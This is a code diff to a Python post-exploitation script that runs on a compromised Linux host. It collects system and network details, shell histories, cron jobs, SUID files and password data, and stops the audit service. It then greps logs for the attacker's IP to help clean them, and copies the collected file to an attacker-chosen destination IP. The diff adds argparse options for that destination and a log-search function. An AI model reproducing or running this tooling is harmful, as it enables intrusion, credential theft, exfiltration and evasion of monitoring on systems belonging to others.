@@ -8,7 +8,20 @@ import os, sys
 import subprocess
 import socket
 from glob import *
+import argparse
 
+##########################################
+## get input arguments
+## file, ip to scp to
+##########################################
+
+parser=argparse.ArgumentParser(description='run on target and send info to -d destination IP and -f file location')
+parser.add_argument('-f','--file',help='string of where you want the final info file to be sent to', required=False,default="/tmp/")
+parser.add_argument('-d','--destinationIP',help='the ip you want the final info file to be sent to',required=True)
+args=parser.parse_args()
+
+IPandLoc=args.destinationIP+":"+args.file
+#print(IPandLoc)
 ##########################################
 ## preliminary data
 # date - time to clean logs from
@@ -36,6 +49,7 @@ from glob import *
 
 def preLim():
     everything=[]
+    everything.append("Label: date on target")
     everything.append(datetime.now())
 
     ntwk=bashCmd("ifconfig")
@@ -54,11 +68,11 @@ def preLim():
         else:
             dev=tmp[0].split(':')[0]
             netInfo['Down'].append(dev)
-    #for j in netInfo.keys():
-    #    print(netInfo[j])
-    everything.append("ifconfig")
-    everything.append(netInfo)  
+    everything.append("Label: ifconfig")
+    everything.append(netInfo)
+    everything.append("Label: hostname:")
     everything.append(socket.gethostname())
+    everything.append("Label: uname-a")
     everything.append(bashCmd("uname -a"))
     
     osRel=""
@@ -66,20 +80,23 @@ def preLim():
         if "release" in name:
             osRel+=bashCmd('cat '+name)
     
-    everything.append("OS Release Info")
+    everything.append("Label: OS Release Info")
     everything.append(osRel)
+    everything.append("Label: free -m")
     everything.append(bashCmd("free -m"))
+    everything.append("Label: user logins")
     everything.append(bashCmd("w"))
+    everything.append("Label: last user logged in")
     everything.append(bashCmd('last'))
-    everything.append('I am')
+    everything.append('Label: I am')
     everything.append(bashCmd("whoami"))
-    everything.append("netstat")
+    everything.append("Label: netstat")
     everything.append(bashCmd("netstat -antup"))
-    everything.append("processes")
+    everything.append("Label: processes")
     everything.append(bashCmd("ps -efH"))
-    everything.append("uptime")
+    everything.append("Label: uptime")
     everything.append(bashCmd("uptime"))
-    everything.append("cron")
+    everything.append("Label: cron")
     everything.append(bashCmd("crontab -l"))
 
     for i in range(0,len(everything)):
@@ -114,31 +131,53 @@ def nextStuff():
         result=bashCmd("systemctl stop audit")
     #if(result==1): every.append("auditting stopped")
     #else: print("audit on")
+    every.append("Label: lsof -l nP")
     every.append(bashCmd("lsof -l nP"))
+    every.append("Label: lsb_release")
     every.append(bashCmd("lsb_release"))
+    every.append("Label: grep for cronjobs")
     every.append(bashCmd("grep -v \"^#||^$\" /etc/crontab /var/spool/cron/crontabs/* /etc/cron.* /etc/cron.d/* /va/spool/cron/atjobs/* 2>/dev/null"))
     try:
+        every.append("Label: atq")
         every.append(bashCmd("atq"),1)
     except:
         pass # print("no atq")
+    every.append("Label: history")
     every.append(bashCmd("cat /root/.bash_history /home/*/*history"))
+    every.append("Label: find \".*\" files")
     every.append(bashCmd("find / -type f -name \".*\""))
+    every.append("Label: find \".*\" directories")
     every.append(bashCmd("find / -type d -name \".*\""))
+    every.append("Label: service status")
     every.append(bashCmd("service --status-all"))
     try:
+        every.append("Label: check configs")
         every.append(bashCmd("chkconfig --list"))
     except:
         every.append("no chkconfig")
     try: 
         result=bashCmd("ulimit -c",1)
+        every.append("Label: ulimit -c")
         every.append("ulimit -c: "+result)
     except: pass # print("no ulimit")
     
+    every.append("Label: ls /home")
     every.append(bashCmd("ls -laR /home"))
+    every.append("Label: ls /")
     every.append(bashCmd("ls -laR / "))
+    every.append("Label: find special perm files")
     every.append(bashCmd("find / -uid 0 -perm -4000"))
-    every.append(bashCmd("find /var/log -type f -mmin 30"))
-    every.append(bashCmd("grep -n \"192.168.1.145\" /var/log/*"))
+    
+    for i in range(0,len(every)):
+        w2File(every[i],"final")
+    
+
+def getLogs():
+    every=[]
+    every.append("Label: find recently touched logs")
+    every.append(bashCmd("find /var/log -type f -mmin -30"))
+    every.append("Label: find logs w/ ip "+args.destinationIP)
+    every.append(bashCmd("grep -n \""+args.destinationIP+"\" /var/log/*"))
 
     for i in range(0,len(every)):
         w2File(every[i],"final")
@@ -191,6 +230,7 @@ def xferFile(dfile,IPandLoc):
 ### IPandLoc = IP and file location to send files
 ### ex: "192.168.10.10:/root/Desktop"
 def logClean(IPandLoc):
+    ''' last two commands in nextStuff()
     try:
         ## will find all logs touched today - up to you to go clean them
         ## logClean.py to come
@@ -210,7 +250,7 @@ def logClean(IPandLoc):
         for k in logsToClean:
             print(k)
     except:
-        pass
+        pass'''
     # xfer file
     xferFile("final",IPandLoc)
     # find all info files
@@ -237,6 +277,7 @@ def getPass():
         w2File("\n\n","final")
         for i in s:
             w2File(i.split('\n')[0],"final",2)
+        w2File("\n\n","final")
 
 ##########################################
 
@@ -246,5 +287,6 @@ if not os.path.exists('/tmp/info'):
 preLim()
 nextStuff()
 getPass()
+getLogs()
 #xferFile("preLiminary","192.168.10.30:/root/Desktop/info")
-logClean("192.168.10.30:/root/Desktop/info")
+logClean(IPandLoc)
